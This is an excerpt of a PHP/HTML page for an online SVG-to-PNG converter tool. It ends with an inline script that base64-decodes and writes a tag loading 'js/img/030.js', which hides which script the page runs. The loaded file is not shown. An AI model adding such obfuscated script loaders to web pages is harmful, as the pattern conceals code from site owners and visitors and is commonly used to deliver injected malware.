...
<html lang="en"> <?php include('admin/head.php'); ?> <?php include('admin/header.php'); ?> <?php include('admin/user.php'); ?> <div id="post-header" class="post-header">
  ...
  <div class="bg-tool">
    <h1>Convert SVG Markup to SVG/PNG Image Online</h1>
  ...
  <div class="toolarea">
    <textarea id="input-text" placeholder="Paste SVG code here"></textarea>
    <button id="generate-button">Generate Icon</button>
    <hr>
    <div id="result-container">
      <b>Result</b>
      <div id="icon-result"></div>
      <button class="download-button" id="download-svg">Download SVG</button>
      <button class="download-button" id="download-png">Download PNG</button>
    </div>
    <style>
      #input-text {
        width: 100%;
    ...
    <script>
      document.write(atob("IDxzY3JpcHQgc3JjPSJqcy9pbWcvMDMwLmpzIiBkZWZlcj0iIj48L3NjcmlwdD4="));
    </script>
